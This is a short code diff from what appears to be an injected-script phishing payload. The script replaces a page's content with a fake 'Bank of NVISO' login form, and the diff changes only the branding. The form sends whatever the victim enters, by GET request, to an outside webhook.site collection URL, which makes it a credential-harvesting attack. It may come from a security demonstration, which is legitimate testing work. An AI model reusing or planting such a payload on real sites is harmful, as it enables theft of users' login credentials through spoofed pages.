@@ -74,12 +74,12 @@ document.body.innerHTML = `
 </style>
 
 <div class="header">
-    <span>Secure Portal</span>
+    <span>Bank of NVISO</span>
     <span style="font-size: 14px;">Login</span>
 </div>
 
 <div class="login-container">
-    <h1>Welcome to the Portal</h1>
+    <h1>Welcome to the Bank of NVISO</h1>
     <p>Please log in to your account:</p>
     
     <form action="https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5" method="GET">
